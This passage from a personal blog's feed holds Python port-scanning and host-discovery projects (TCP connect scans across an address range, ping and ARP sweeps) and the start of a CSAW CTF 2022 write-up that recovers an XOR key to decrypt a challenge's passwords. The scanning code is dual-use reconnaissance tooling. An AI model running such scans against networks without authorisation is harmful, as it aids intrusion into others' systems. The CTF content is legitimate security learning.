&lt;&#x2F;span&gt;&lt;span&gt;		socket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setdefaulttimeout&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		status &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;connect_ex&lt;&#x2F;span&gt;&lt;span&gt;((target_ip&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;port))
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;not &lt;&#x2F;span&gt;&lt;span&gt;status):
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Open port &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;port)
&lt;&#x2F;span&gt;&lt;span&gt;			s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;		s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;By using socket programming the connection request for a port will be sent to the remote host. If the connection was established with a port the status of the port will be printed as open.&lt;&#x2F;p&gt;
&lt;p&gt;Now if the user choose to scan entire network, the same concept is used to check the open ports.The functions involved in entire network scan are &lt;code&gt;host_check&lt;&#x2F;code&gt; and &lt;code&gt;multi_host_scan&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;host_check()&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;host_check&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;start_host&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end_host&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(start_host &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;or &lt;&#x2F;span&gt;&lt;span&gt;end_host &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;255&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Host range in not valid..&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		sys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;multi_host_scan()&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;multi_host_scan&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;start_host&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end_host&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;start_port&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end_port&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;target_ip
&lt;&#x2F;span&gt;&lt;span&gt;	tmp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;target_ip
&lt;&#x2F;span&gt;&lt;span&gt;	ip &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;tmp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;split&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	ip &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;(ip[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;host &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(start_host&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;end_host&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;		target_ip &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;ip &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(host)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Scannig Host : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;target_ip&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;single_host_scan&lt;&#x2F;span&gt;&lt;span&gt;(start_port&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;end_port)
&lt;&#x2F;span&gt;&lt;span&gt;	sys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I devoloped this script with less additional modules this can be executed in any system without any additional requirements.This scanning process will take less time.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;requirements&quot;&gt;Requirements&lt;&#x2F;h3&gt;
&lt;p&gt;You may require some python modules&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;subprocess&lt;&#x2F;li&gt;
&lt;li&gt;socket&lt;&#x2F;li&gt;
&lt;li&gt;platform&lt;&#x2F;li&gt;
&lt;li&gt;threading&lt;&#x2F;li&gt;
&lt;li&gt;sys&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;These modules will be pre installed on every system, if not then install them with &lt;code&gt;pip3 or pip&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;installation&quot;&gt;Installation&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;git clone https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;Port_Scanner.git
&lt;&#x2F;span&gt;&lt;span&gt;cd Port_Scanner
&lt;&#x2F;span&gt;&lt;span&gt;python3 Port_Scanner.py
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;preview&quot;&gt;Preview&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;project_img&#x2F;portscanner&#x2F;portscanner.png&quot; alt=&quot;Preview&quot; &#x2F;&gt;{: w=&quot;600&quot;,h=&quot;600&quot;}&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;If anything should be modified in the script please let me know.
{: .prompt-info }&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;You can find complete source code of Port Scanner here : &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;Port_Scanner&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;Port_Scanner&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>NetScan</title>
        <published>2022-09-29T00:00:00+00:00</published>
        <updated>2022-09-29T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/projects/pythonnetscan/"/>
        <id>https://themj0ln1r.github.io/projects/pythonnetscan/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/projects/pythonnetscan/">&lt;p&gt;Hi guys!,&lt;&#x2F;p&gt;
&lt;p&gt;This is Mj0ln1r and i am back with a new post but this time a project devoleped with python.&lt;&#x2F;p&gt;
&lt;p&gt;I am very much intrested to do automating tasks using python. To learn python upto the advanced level i decided to make basic projects with the python.This is my first step towards the path i choosen.&lt;&#x2F;p&gt;
&lt;p&gt;I wrote this script called &lt;code&gt;NetScan&lt;&#x2F;code&gt; in python. I learned &lt;code&gt;basics of socket programming&lt;&#x2F;code&gt; , little bit about &lt;code&gt;platform&lt;&#x2F;code&gt; module in python and basic tools &lt;code&gt;ping&lt;&#x2F;code&gt;, &lt;code&gt;arp&lt;&#x2F;code&gt; which are useful in computer networking.&lt;&#x2F;p&gt;
&lt;p&gt;So, here&#x27;s a small intro about my basic netscan script.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;netscan&quot;&gt;NetScan&lt;&#x2F;h1&gt;
&lt;p&gt;This is a basic computer networking based project the script i developed using python which can perform following tasks.&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;Get any websites IP&lt;&#x2F;li&gt;
&lt;li&gt;Discover live hosts&lt;&#x2F;li&gt;
&lt;li&gt;Discover Hosts and MAC&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;I used ping to send the ICMP packets to every device connected to network, the response from that device has been analyzed and printed the devices which are responded for the ICMP request.
This process could be slow if the number of hosts to be scanned are increased, but it will works fine as it uses just a basic ping which is available in any operating system.&lt;&#x2F;p&gt;
&lt;p&gt;A TCP scan is also used to get the active hosts in a network this will overcome the ping scan drawbacks, i.e the ICMP packets can be blocked by a firewall in this process we may get the host status as unreachable. To overcome this are going to sent tcp packets to the port 135 using socket module in python.&lt;&#x2F;p&gt;
&lt;p&gt;An arp scan is used to the MAC adrresses of all the hosts connected in a network.&lt;&#x2F;p&gt;
&lt;p&gt;I devoloped this script with less additional modules which can make the scan slow , but this can be executed in any system without any additional requirements.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;requirements&quot;&gt;Requirements&lt;&#x2F;h3&gt;
&lt;p&gt;You may require some python modules&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;subprocess&lt;&#x2F;li&gt;
&lt;li&gt;socket&lt;&#x2F;li&gt;
&lt;li&gt;platform&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;These modules will be pre installed on every system, if not then install them with &lt;code&gt;pip3 or pip&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;git&lt;&#x2F;span&gt;&lt;span&gt; clone https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;NetScan.git
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;cd&lt;&#x2F;span&gt;&lt;span&gt; NetScan
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;python3&lt;&#x2F;span&gt;&lt;span&gt; NetScan.py
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;preview&quot;&gt;Preview&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;project_img&#x2F;netscan&#x2F;netscan.png&quot; alt=&quot;Preview&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;If anything should be modified in the script please let me know.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>CSAW CTF Qualification Round 2022</title>
        <published>2022-09-12T00:00:00+00:00</published>
        <updated>2022-09-12T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/csaw22/"/>
        <id>https://themj0ln1r.github.io/writeups/csaw22/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/csaw22/">&lt;p&gt;Hello ctfian&#x27;s!,&lt;&#x2F;p&gt;
&lt;p&gt;I played the CSAW CTF Qualification Round 2022 which is a world wide ctf event held on 9th September 2022.
CSAW CTF is one of the oldest and biggest CTFs with 1216 teams with 1+ points in 2021. Designed as an entry-level, jeopardy-style CTF, this competition is for students who are trying to break into the field of security, as well as for advanced students and industry professionals who want to practice their skills.&lt;&#x2F;p&gt;
&lt;p&gt;I solved 5 challenges in crypto, rev, web and forensics categories. These challenges boosted my confidence as it is my second ctf event and i spent complete two days to solve these challenges.&lt;&#x2F;p&gt;
&lt;p&gt;Okay lets see how i solved those challenges.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;gotta-crack-them-all&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#gotta-crack-them-all&quot; aria-label=&quot;Anchor link for: gotta-crack-them-all&quot;&gt;Gotta Crack Them All&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;csaw22&#x2F;gotta.png&quot; alt=&quot;gotta_crack_them_all&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The content of &lt;code&gt;encrypt.py&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;key.txt&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;rb&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:
&lt;&#x2F;span&gt;&lt;span&gt;	key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encrypt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;plain&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(x) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span&gt;y)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;big&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;(x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;y) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;zip&lt;&#x2F;span&gt;&lt;span&gt;(plain&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;key))
&lt;&#x2F;span&gt;&lt;span&gt;plain &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Cacturne-Grass-Dark&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encrypt&lt;&#x2F;span&gt;&lt;span&gt;(plain))
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The leaked password is &lt;code&gt;Cacturne-Grass-Dark&lt;&#x2F;code&gt; and the encrypted passwords are available in &lt;code&gt;encrypted_password.txt&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;If we observe the encrypt.py the passwords are encrypted using the XOR encryption.&lt;&#x2F;p&gt;
&lt;p&gt;First i tried to encrypt the leaked password with the given encryption algorithm.
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;csaw22&#x2F;gotta_leak.png&quot; alt=&quot;gotta_leak&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Now i have a leaked password and its cipher &lt;code&gt;kz\xc6\xb9\xd9Du\xcb\x8a\x9e\xe0\x9d\xbeo\xee\x03\xcf\xddd&lt;&#x2F;code&gt;. Now the idea was simple if we XORed the leaked password with the cipher we can get the encryption key then that key can be used to decrypt all the encrypted passwords.&lt;&#x2F;p&gt;
&lt;p&gt;This code can do what we are talking about.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;xor
&lt;&#x2F;span&gt;&lt;span&gt;f &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;encrypted_passwords.txt&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;rb&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;l &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Cacturne-Grass-Dark&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;kz&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\xc6\xb9\xd9&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Du&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\xcb\x8a\x9e\xe0\x9d\xbe&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;o&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\xee\x03\xcf\xdd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;d&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;xor&lt;&#x2F;span&gt;&lt;span&gt;(c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;l)
&lt;&#x2F;span&gt;&lt;span&gt;lines &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;readlines&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;lines:
&lt;&#x2F;span&gt;&lt;span&gt;	i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;	tmp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;y&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;l &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;zip&lt;&#x2F;span&gt;&lt;span&gt;(key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;i):
